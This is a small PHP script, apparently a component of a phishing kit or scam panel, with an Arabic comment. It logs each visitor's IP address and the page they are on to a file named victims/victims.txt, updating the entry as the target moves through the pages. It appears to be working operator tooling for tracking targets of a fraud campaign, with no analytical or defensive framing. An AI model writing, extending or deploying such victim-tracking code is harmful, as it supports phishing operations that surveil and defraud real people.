<?php

$ip = get_client_ip();

// استعمل الاسم المخصص إذا متوفر، وإلا استعمل اسم الملف
$page = isset($customPageName) ? $customPageName : strtoupper(pathinfo(basename($_SERVER['PHP_SELF']), PATHINFO_FILENAME));

$victimsFile = "./victims/victims.txt";
if (!is_dir("victims")) {
    mkdir("victims", 0755, true);
}

$lines = file_exists($victimsFile) ? file($victimsFile, FILE_IGNORE_NEW_LINES) : [];
$newLines = [];
$found = false;

foreach ($lines as $line) {
    if (strpos($line, $ip . ' => ') === 0) {
        $newLines[] = "$ip => $page";
        $found = true;
    } else {
        $newLines[] = $line;
    }
}

if (!$found) {
    $newLines[] = "$ip => $page";
}

file_put_contents($victimsFile, implode(PHP_EOL, $newLines));
?>

